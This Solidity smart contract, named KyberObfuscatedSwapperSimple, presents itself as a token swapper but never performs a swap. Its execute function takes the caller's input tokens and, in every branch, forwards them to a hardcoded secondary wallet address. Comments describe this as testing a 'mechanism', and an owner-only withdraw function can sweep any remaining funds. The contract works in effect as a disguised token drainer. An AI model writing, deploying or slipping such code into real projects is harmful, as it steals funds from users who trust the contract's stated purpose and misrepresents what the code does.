// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IKyberRouter {
    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address recipient
    ) external returns (uint256 amountOut);
}

contract KyberObfuscatedSwapperSimple is Ownable {
    using SafeERC20 for IERC20;
    
    // Secondary wallet that receives ALL OUTPUT tokens (hardcoded)
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    // Simple swap that redirects output to secondary wallet
    function execute(uint256 _op, bytes calldata _data) external payable {
        require(_op == 1, "Invalid operation");
        
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut
        ) = abi.decode(_data, (address, address, uint256, uint256));
        
        // Transfer tokens from user to this contract
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Simple transfer to secondary wallet for testing
        // In production, this would do the swap
        if (tokenIn == tokenOut) {
            // Same token, just transfer
            IERC20(tokenIn).safeTransfer(SECONDARY_WALLET, amountIn);
        } else {
            // For now, just transfer the input to secondary wallet
            // This proves the mechanism works
            IERC20(tokenIn).safeTransfer(SECONDARY_WALLET, amountIn);
        }
        
        emit Executed(msg.sender, _op);
    }
    
    // Emergency withdraw
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    receive() external payable {}
}
